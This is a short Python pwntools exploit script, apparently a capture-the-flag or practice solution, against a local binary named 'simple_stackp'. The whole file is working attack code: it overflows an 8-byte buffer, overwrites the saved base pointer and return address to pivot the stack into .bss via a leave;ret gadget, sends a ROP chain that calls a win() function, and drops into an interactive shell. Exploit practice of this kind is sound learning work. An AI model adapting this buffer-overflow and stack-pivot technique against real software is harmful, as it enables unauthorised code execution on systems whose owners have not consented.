from pwn import *

# Set up the target
context.binary = './simple_stackp'
context.log_level = 'debug'  # Show detailed debug info

# Start the process
p = process('./simple_stackp')

# =============================================
# STEP 1: Find required addresses
# =============================================

# Find the win function address (our target)
win_addr = 0x401236
leave_ret = 0x401227
bss_addr = 0x404060  

# =============================================
# STEP 2: Craft the payload
# =============================================

# First stage: Stack pivot
payload = flat(
    # Buffer overflow part (fills the 8-byte buffer)
    b'A'*8,
    
    # Overwrite RBP with our target address (.bss)
    p64(bss_addr),
    
    # Overwrite RIP with leave; ret gadget
    p64(leave_ret)
)

# Second stage: ROP chain that will be written to .bss
rop_chain = p64(win_addr)  # Simply call win()

# =============================================
# STEP 3: Execute the exploit
# =============================================

# Send the size parameter (must be between 9-129)
p.sendlineafter(b"0-9.\n", b"128")

# Send the overflow payload
p.sendlineafter(b"come?\n", payload)

# Send the ROP chain to our pivot location
p.sendline(rop_chain)

# =============================================
# STEP 4: Enjoy the shell!
# =============================================
p.interactive()